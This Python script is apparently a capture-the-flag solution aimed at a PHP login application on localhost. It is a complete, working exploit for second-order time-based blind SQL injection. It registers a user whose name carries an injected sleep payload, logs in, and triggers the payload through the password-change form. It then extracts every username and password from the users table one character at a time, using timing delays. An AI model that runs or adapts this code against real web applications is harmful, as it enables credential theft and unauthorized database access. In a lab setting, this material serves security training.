import requests
import time
import random
import string

BASE_URL = 'http://localhost:7777'
session = requests.Session()

def random_suffix():
    return ''.join(random.choices(string.ascii_lowercase, k=6))

def register_user(username, password):
    url = f'{BASE_URL}/new_user.php'
    data = {'new_username': username, 'new_password': password, 'submit': '创建用户'}
    try:
        session.post(url, data=data, timeout=15)
        return True
    except:
        return False

def login_user(username, password):
    url = f'{BASE_URL}/index.php'
    data = {'login_user': username, 'login_password': password}
    try:
        session.post(url, data=data, timeout=15)
        return True
    except:
        return False

def time_blind(sql_condition):
    suffix = random_suffix()
    payload_username = f"admin' and if({sql_condition}, sleep(3), 0) or password=? -- -{suffix}"
    password = 'x'
    
    register_user(payload_username, password)
    login_user(payload_username, password)
    
    url = f'{BASE_URL}/logged-in.php'
    data = {'current_password': 'x', 'new_password': 'x', 'submit': '确认修改'}
    
    start = time.time()
    try:
        session.post(url, data=data, timeout=15)
    except:
        pass
    
    return time.time() - start >= 2.5

def get_length(sql, max_len=100):
    for i in range(1, max_len + 1):
        if time_blind(f"length(({sql}))={i}"):
            return i
    return 0

def get_string(sql, length):
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}@. -!'
    result = ''
    for pos in range(1, length + 1):
        for c in chars:
            if time_blind(f"ascii(substr(({sql}),{pos},1))={ord(c)}"):
                result += c
                print(c, end='', flush=True)
                break
    print()
    return result

# ==================== 逐行遍历，自动找 flag ====================

print("遍历 users 表，查找所有数据...\n")

for row_idx in range(20):  # 最多查 20 行
    # 获取 username 长度
    user_len = get_length(f"select username from users limit {row_idx},1")
    if user_len == 0:
        print(f"第 {row_idx+1} 行无数据，遍历结束")
        break
    
    # 获取 username
    print(f"[+] 第 {row_idx+1} 行 username: ", end='')
    username = get_string(f"select username from users limit {row_idx},1", user_len)
    
    # 获取 password 长度
    pass_len = get_length(f"select password from users limit {row_idx},1")
    
    # 获取 password
    print(f"[+] 第 {row_idx+1} 行 password: ", end='')
    password = get_string(f"select password from users limit {row_idx},1", pass_len)
    
    print(f"[+] 结果: {username} : {password}\n")
    
    # 自动识别 flag
    if 'flag{' in password or 'flag' in username.lower():
        print(f"{'='*60}")
        print(f"[★] 找到 FLAG: {password}")
        print(f"{'='*60}")
        break